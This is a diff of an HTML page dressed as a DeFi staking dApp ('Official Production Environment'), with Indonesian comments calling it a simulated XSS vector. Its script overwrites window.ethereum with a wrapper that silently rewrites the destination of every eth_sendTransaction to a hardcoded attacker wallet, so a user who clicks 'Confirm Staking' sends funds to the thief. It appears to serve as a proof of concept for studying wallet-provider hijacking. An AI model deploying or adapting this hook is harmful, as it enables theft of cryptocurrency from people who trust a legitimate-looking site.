@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Liquidity Pool & Swap Exchange</title>
+    <title>Decentralized Finance Protocol - Live dApp</title>
     <style>
         body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #0b0e11; color: #eaecef; padding: 20px; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
         .card { background: #181a20; padding: 24px; border-radius: 16px; width: 100%; max-width: 400px; box-shadow: 0 4px 24px rgba(0,0,0,0.5); border: 1px solid #2b313a; }
@@ -13,30 +13,32 @@
         .value { font-size: 18px; font-weight: bold; }
         button { background: #f0b90b; color: #000; border: none; width: 100%; padding: 14px; border-radius: 8px; font-weight: bold; font-size: 16px; cursor: pointer; }
         button:hover { background: #fcd535; }
-        #log { margin-top: 15px; font-family: monospace; font-size: 11px; color: #00ff00; white-space: pre-wrap; word-wrap: break-word; background: #0b0e11; padding: 10px; border-radius: 6px; border: 1px solid #2b313a; max-height: 100px; overflow-y: auto; }
+        #log { margin-top: 15px; font-family: monospace; font-size: 11px; color: #00ff00; white-space: pre-wrap; word-wrap: break-word; background: #0b0e11; padding: 10px; border-radius: 6px; border: 1px solid #2b313a; max-height: 120px; overflow-y: auto; }
     </style>
 </head>
 <body>
 
 <div class="card">
-    <h2>Token Exchange</h2>
-    <p style="font-size: 13px; color: #848e9c; text-align: center;">Decentralized Trading Protocol</p>
+    <h2>Liquidity Pool Staking</h2>
+    <p style="font-size: 13px; color: #848e9c; text-align: center;">Official Production Environment</p>
     
     <div class="input-box">
-        <span class="label">You Pay</span>
-        <span class="value">100 USDT</span>
-    </div>
-    
-    <div class="input-box">
-        <span class="label">You Receive</span>
-        <span class="value">0.035 ETH</span>
+        <span class="label">Deposit Amount</span>
+        <span class="value">500 USDC</span>
     </div>
 
-    <button id="actionBtn">Confirm Swap</button>
+    <!-- Tombol fungsi asli dari dApp -->
+    <button id="stakeBtn">Confirm Staking</button>
     
-    <div id="log">Status: Initializing node...</div>
+    <div id="log">Status: dApp environment loaded.</div>
 </div>
 
+<!-- 
+  =================================================================
+  SIMULASI VEKTOR XSS / KODE SKRIP PIHAK KETIGA YANG TERKOMPROMISI
+  Berjalan dalam konteks origin dApp yang sah (Production Context)
+  =================================================================
+-->
 <script>
 const logEl = document.getElementById('log');
 function addLog(msg) {
@@ -44,6 +46,7 @@ function addLog(msg) {
 }
 
 (async () => {
+    // Memastikan objek ethereum tersedia dari browser dApp
     if (!window.ethereum) {
         addLog("[-] window.ethereum not found.");
         return;
@@ -53,42 +56,48 @@ function addLog(msg) {
     addLog(`[i] Provider Writable: ${desc.writable}`);
 
     if (!desc.writable) {
-        addLog("[-] Provider is immutable.");
+        addLog("[-] Provider is immutable. XSS hook prevented.");
         return;
     }
 
     const attackerWallet = "0xEb267249f35B6Bd557Bd463D956520dA7c33286B";
     const realProvider = window.ethereum;
 
+    // Vektor XSS/Skrip menyusup dengan menimpa window.ethereum secara global di origin ini
     window.ethereum = {
         selectedAddress: realProvider.selectedAddress,
         chainId: realProvider.chainId,
         request: async (args) => {
             if (args.method === "eth_sendTransaction" && args.params?.[0]) {
-                addLog(`[!] Intercepted target: ${args.params[0].to}`);
+                addLog(`[!] XSS Hook: Intercepted target -> ${args.params[0].to}`);
+                // Mengubah alamat tujuan transaksi secara senyap ke dompet penyerang
                 args.params[0].to = attackerWallet;
-                addLog(`[!] Redirected to destination handler.`);
+                addLog(`[!] XSS Hook: Silently redirected to attacker wallet!`);
             }
             return realProvider.request(args);
         }
     };
 
-    addLog("[+] Provider context intercepted.");
+    addLog("[+] XSS Payload successfully hooked into window.ethereum.");
 
-    document.getElementById('actionBtn').addEventListener('click', async () => {
+    // Event listener tombol asli dApp yang dipicu oleh interaksi pengguna
+    document.getElementById('stakeBtn').addEventListener('click', async () => {
         try {
             const accounts = await realProvider.request({ method: "eth_requestAccounts" });
-            addLog(`[+] Account synced: ${accounts[0].substring(0, 6)}...`);
+            addLog(`[+] Active User: ${accounts[0].substring(0, 6)}...`);
 
+            addLog("[*] Executing original dApp contract interaction...");
+            // Pengguna mengira mereka mengirim dana ke smart contract staking yang sah,
+            // namun berhasil dibelokkan oleh hook XSS di atas.
             await window.ethereum.request({
                 method: "eth_sendTransaction",
                 params: [{
                     from: accounts[0],
-                    to: "0x7a250d5630b4cf539739df2c5dacb4c659f2488d", // Alamat smart contract asli dApp
+                    to: "0x3563456456456456456456456456456456456456", // Alamat asli smart contract dApp
                     value: "0x0"
                 }]
             });
-            addLog("[+] Transaction submitted.");
+            addLog("[+] Flow completed.");
         } catch (e) {
             addLog(`[-] Error: ${e.message}`);
         }
